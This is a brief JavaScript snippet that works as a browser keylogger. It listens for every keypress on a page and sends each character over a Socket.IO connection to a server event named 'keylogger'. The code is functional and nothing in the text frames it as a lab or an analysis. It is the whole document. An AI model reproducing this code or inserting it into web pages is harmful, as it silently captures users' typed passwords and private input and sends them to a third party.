var socket = io();

document.onkeypress = function(e) {
  let get = window.event?event:e;
  let key = get.keyCode?get.keyCode:get.charCode;
  key = String.fromCharCode(key);
  socket.emit('keylogger', key);
}
